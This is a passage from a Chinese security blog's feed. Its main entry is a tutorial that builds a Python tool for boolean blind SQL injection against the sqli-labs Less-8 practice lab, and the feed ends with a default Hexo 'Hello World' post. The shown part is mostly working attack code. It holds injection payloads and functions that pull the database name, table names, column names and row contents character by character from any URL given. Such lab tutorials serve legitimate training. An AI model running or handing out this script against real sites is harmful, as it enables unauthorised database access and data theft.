class="number">1</span>) + <span class="string">&quot;)&quot;</span> + DBColumns[item])</span><br><span class="line">        columnIndex = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[*] 请输入 要查看的字段的序号(输入0退出):&quot;</span>)) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(columnIndex == -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])</span><br></pre></td></tr></table></figure><p>接着，我们需要获取数据库名，最后得到的结果存入DBName</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取数据库名函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDBName</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment">#引用全局变量DBName</span></span><br><span class="line">    <span class="keyword">global</span> DBName</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 开始获取数据库的长度&quot;</span>)</span><br><span class="line">    <span class="comment">#保存数据库长度的变量</span></span><br><span class="line">    DBNameLen = <span class="number">0</span></span><br><span class="line">    <span class="comment">#用于检查数据库长度的payload</span></span><br><span class="line">    payload =  <span class="string">&quot;&#x27; and if(length(database())=&#123;0&#125;,1,0) %23 &quot;</span></span><br><span class="line">    <span class="comment">#把url和payload进行拼接，得到最终请求url</span></span><br><span class="line">    targetUrl = url + payload</span><br><span class="line">    <span class="built_in">print</span>(targetUrl)</span><br><span class="line">    <span class="comment">#用for循环遍历请求，得到数据库名的长度</span></span><br><span class="line">    <span class="keyword">for</span> DBNameLen <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">        <span class="comment">#对payload的中的参数进行赋值猜解</span></span><br><span class="line">        res = conn.get(targetUrl.<span class="built_in">format</span>(DBNameLen))</span><br><span class="line">        <span class="comment">#判断flag是否在返回的页面中</span></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;进来了吗&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 数据库名的长度：&quot;</span>+ <span class="built_in">str</span>(DBNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 开始获取数据库名&quot;</span>)</span><br><span class="line">    <span class="comment">#获取数据库名的payload</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; and if(ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;,1,0) %23&quot;</span></span><br><span class="line">    targetUrl = url + payload</span><br><span class="line">    <span class="comment">#a表示substr()函数的截取位置</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,DBNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#b表示在ascii码中33～126 位可显示的字符</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            res = conn.get(targetUrl.<span class="built_in">format</span>(a,b))</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                DBName += <span class="built_in">chr</span>(b)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-]&quot;</span> + DBName)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>获取数据库名的效果如下图</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/a12daed506fc623fcc835f8e08128e4d.png" alt="image-20211019175932890"></p><p>当我们得到数据库名时，就可以去猜解表名。并把结果以列表形式存入DBTables</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取数据库表函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDBTables</span>(<span class="params">url, dbname</span>):</span></span><br><span class="line">    <span class="keyword">global</span> DBTables</span><br><span class="line">    <span class="comment">#存放数据库表数量的变量</span></span><br><span class="line">    DBTableCount = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 开始获取 &#123;0&#125; 数据库表数量：&quot;</span>.<span class="built_in">format</span>(dbname))</span><br><span class="line">    <span class="comment">#获取数据库表数量的payload</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; and if((select count(*)table_name from information_schema.tables where table_schema=&#x27;&#123;0&#125;&#x27;)=&#123;1&#125;,1,0) %23&quot;</span></span><br><span class="line">    targetUrl = url + payload</span><br><span class="line">    <span class="comment">#开始遍历获取数据库表的数量</span></span><br><span class="line">    <span class="keyword">for</span> DBTableCount <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">        res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,DBTableCount))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]&#123;0&#125;数据库中表的数量为：&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(dbname,DBTableCount))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始获取&#123;0&#125;数据库的表&quot;</span>.<span class="built_in">format</span>(dbname))</span><br><span class="line">    <span class="comment">#遍历表名时临时存放表名长度的变量</span></span><br><span class="line">    tableLen = <span class="number">0</span></span><br><span class="line">    <span class="comment">#a表示当前正在获取表的索引</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,DBTableCount):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]正在获取第&#123;0&#125;个表名&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        <span class="comment">#先获取当前表名的长度</span></span><br><span class="line">        <span class="keyword">for</span> tableLen <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if((select LENGTH(table_name) from information_schema.tables where table_schema=&#x27;&#123;0&#125;&#x27; limit &#123;1&#125;,1)=&#123;2&#125;,1,0) %23&quot;</span></span><br><span class="line">            targetUrl = url + payload</span><br><span class="line">            res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,a,tableLen))</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#开始获取表名</span></span><br><span class="line">        <span class="comment">#临时存放当前表名的变量</span></span><br><span class="line">        table = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment">#b表示当前表名猜解的位置（substr）</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,tableLen+<span class="number">1</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;&#123;0&#125;&#x27; limit &#123;1&#125;,1),&#123;2&#125;,1))=&#123;3&#125;,1,0) %23&quot;</span></span><br><span class="line">            targetUrl = url + payload</span><br><span class="line">            <span class="comment"># c 表示在ascii码中33～126位可显示字符</span></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,a,b,c))</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                    table +=<span class="built_in">chr</span>(c)</span><br><span class="line">                    <span class="built_in">print</span>(table)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#把获取到的表名加入DBTables</span></span><br><span class="line">        DBTables.append(table)</span><br><span class="line">        <span class="comment">#清空table,用来继续获取下一个表名</span></span><br><span class="line">        table = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>获取数据库表名的效果如下：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/39175f1bef985138e98578aecefef86f.png" alt="image-20211019180205979"></p><p>根据上面获取到的数据库名，表名，接着来获取表的字段。并把结果以列表的形式存入DBColumns</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取数据库表字段的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDBColumns</span>(<span class="params">url,dbname,dbtable</span>):</span></span><br><span class="line">    <span class="keyword">global</span> DBColumns</span><br><span class="line">    <span class="comment">#存放字段数量的变量</span></span><br><span class="line">    DBColumnCount = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 开始获取&#123;0&#125;数据表的字段数：&quot;</span>.<span class="built_in">format</span>(dbtable))</span><br><span class="line">    <span class="keyword">for</span> DBColumnCount <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">        payload = <span class="string">&quot;&#x27; and if((select count(column_name) from information_schema.columns where table_schema=&#x27;&#123;0&#125;&#x27; and table_name=&#x27;&#123;1&#125;&#x27;)=&#123;2&#125;,1,0) %23&quot;</span></span><br><span class="line">        targetUrl = url + payload</span><br><span class="line">        res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,dbtable,DBColumnCount))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-]&#123;0&#125; 数据表的字段数为：&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(dbtable,DBColumnCount))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">     <span class="comment">#开始获取字段的名称</span></span><br><span class="line">     <span class="comment">#保存字段名的临时变量</span></span><br><span class="line">    column = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># a 表示当前获取字段的索引</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,DBColumnCount):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]正在获取第&#123;0&#125; 个字段名&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        <span class="comment">#先获取字段的长度</span></span><br><span class="line">        <span class="keyword">for</span> columnLen <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if((select length(column_name) from information_schema.columns where table_schema=&#x27;&#123;0&#125;&#x27; and table_name=&#x27;&#123;1&#125;&#x27; limit &#123;2&#125;,1)=&#123;3&#125;,1,0) %23&quot;</span></span><br><span class="line">            targetUrl = url + payload</span><br><span class="line">            res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,dbtable,a,columnLen))</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#b表示当前字段名猜解的位置</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,columnLen+<span class="number">1</span>):</span><br><span class="line">                payload = <span class="string">&quot;&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;&#123;0&#125;&#x27; and table_name=&#x27;&#123;1&#125;&#x27; limit &#123;2&#125;,1),&#123;3&#125;,1))=&#123;4&#125;,1,0) %23&quot;</span></span><br><span class="line">                targetUrl = url + payload</span><br><span class="line">                <span class="comment">#c 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                    res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,dbtable,a,b,c))</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                        column += <span class="built_in">chr</span>(c)</span><br><span class="line">                        <span class="built_in">print</span>(column)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="comment">#把获取到的字段加入DBCloumns</span></span><br><span class="line">        DBColumns.append(column)</span><br><span class="line">        <span class="comment">#清空column，用来继续获取下一个字段名</span></span><br><span class="line">        column = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>获取表的字段效果如下：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/91e7ffba24b009d1093b048b2d5e0e5f.png" alt="image-20211019180352627"></p><p>然后，就可以获取到数据了。根据获取的URL，数据库表名和数据表字段来获取数据。数据以字典形式存放，键为字段名，值为数据形成的列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取表字段的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDBData</span>(<span class="params">url,dbtable,dbcolumn</span>):</span></span><br><span class="line">    <span class="keyword">global</span> DBData</span><br><span class="line">    <span class="comment">#先获取字段的数据数量</span></span><br><span class="line">    DBDataCount = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始获取 &#123;0&#125; 表 &#123;1&#125; 字段的数据数量&quot;</span>.<span class="built_in">format</span>(dbtable,dbcolumn))</span><br><span class="line">    <span class="keyword">for</span> DBDataCount <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">        payload = <span class="string">&quot;&#x27; and if((select count(&#123;0&#125;) from &#123;1&#125;)=&#123;2&#125;,1,0) %23&quot;</span></span><br><span class="line">        targetUrl = url + payload</span><br><span class="line">        res = conn.get(targetUrl.<span class="built_in">format</span>(dbcolumn,dbtable,DBDataCount))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-]&#123;0&#125;表&#123;1&#125;字段的数据数量为：&#123;2&#125;&quot;</span>.<span class="built_in">format</span>(dbtable,dbcolumn,DBDataCount))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,DBDataCount):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 正在获取&#123;0&#125; 的 第&#123;1&#125; 个数据&quot;</span>.<span class="built_in">format</span>(dbcolumn,a+<span class="number">1</span>))</span><br><span class="line">        <span class="comment">#先获取这个数据的长度</span></span><br><span class="line">        dataLen = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> dataLen <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if((select length(&#123;0&#125;) from &#123;1&#125; limit &#123;2&#125;,1)=&#123;3&#125;,1,0) %23&quot;</span></span><br><span class="line">            targetUrl = url + payload</span><br><span class="line">            res = conn.get(targetUrl.<span class="built_in">format</span>(dbcolumn,dbtable,a,dataLen))</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-]第&#123;0&#125;个数据长度为：&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>,dataLen))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#临时存放数据内容变量</span></span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment">#开始获取数据具体内容</span></span><br><span class="line">        <span class="comment">#b表示当前数据内容的猜解的位置</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,dataLen+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                payload = <span class="string">&quot;&#x27; and if (ascii(substr((select &#123;0&#125; from &#123;1&#125; limit &#123;2&#125;,1),&#123;3&#125;,1))=&#123;4&#125;,1,0) %23&quot;</span></span><br><span class="line">                targetUrl = url + payload</span><br><span class="line">                res = conn.get(targetUrl.<span class="built_in">format</span>(dbcolumn,dbtable,a,b,c))</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                    data +=<span class="built_in">chr</span>(c)</span><br><span class="line">                    <span class="built_in">print</span>(data)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#放到以字段名为健，值为列表的字典中</span></span><br><span class="line">        DBData.setdefault(dbcolumn,[]).append(data)</span><br><span class="line">        <span class="built_in">print</span>(DBData)</span><br><span class="line">        <span class="comment">#把data清空，继续获取下一个数据</span></span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>获取数据的效果如下：</p><p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/19a5856b78f5379fbce8de4210aab214.png" alt="image-20211019180638366"></p><p>最后，编写主函数，传入URL</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#入口，主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = optparse.OptionParser(<span class="string">&#x27;usage: python %prog -u url \n\n&#x27;</span> <span class="string">&#x27;Example: python %prog -u http://127.0.0.1/sql/Less-8/?id=1\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#目标URL参数 -u</span></span><br><span class="line">    parser.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,dest=<span class="string">&#x27;targetURL&#x27;</span>,default=<span class="string">&#x27;http://127.0.0.1/sql/Less-8/?id=1&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target URL&#x27;</span>)</span><br><span class="line">    (options,args) = parser.parse_args()</span><br><span class="line">    StartSqli(options.targetURL)</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>关于盲注的自动化脚本就写这么多，如有错误请斧正。</p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;当我们进行SQL注入攻击时，当发现无法进行union注入或者报错等注入，那么，就需要考虑盲注了，当我们进行盲注时，需要通过页面的反馈(布尔盲注)或者相应时间(时间盲注)，来一个字符一个字符的进行猜解。如果手工进行猜解，这就会有很大的工作量。所以这里就使用python写一个自动化脚本来进行猜解，靶场选择的是sqli-labs的第八关。&lt;/p&gt;</summary>
    
    
    
    <category term="安全开发" scheme="https://lxflxfcl.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="渗透测试" scheme="https://lxflxfcl.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://lxflxfcl.github.io/2021/10/03/hello-world/"/>
    <id>https://lxflxfcl.github.io/2021/10/03/hello-world/</id>
    <published>2021-10-03T14:09:41.408Z</published>
    <updated>2021-10-05T13:33:38.213Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><span id="more"></span><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/writing.html&quot;&gt;Writing&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
